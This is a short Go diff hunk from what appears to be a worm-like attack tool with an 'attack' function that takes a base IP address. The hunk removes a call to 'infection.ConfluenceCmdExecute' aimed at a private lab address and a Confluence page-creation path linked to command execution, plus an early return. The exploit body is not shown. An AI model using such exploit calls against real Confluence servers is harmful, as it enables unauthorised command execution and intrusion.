@@ -58,8 +58,6 @@ func attack(wg *sync.WaitGroup, id int, baseIp [4]int) {
 }
 
 func main() {
-	infection.ConfluenceCmdExecute("http://10.0.2.8:8090","/pages/createpage-entervariables.action?SpaceKey=x")
-	return
 	f, err := os.Create("/tmp/test")
 	if err != nil {
         panic(err)
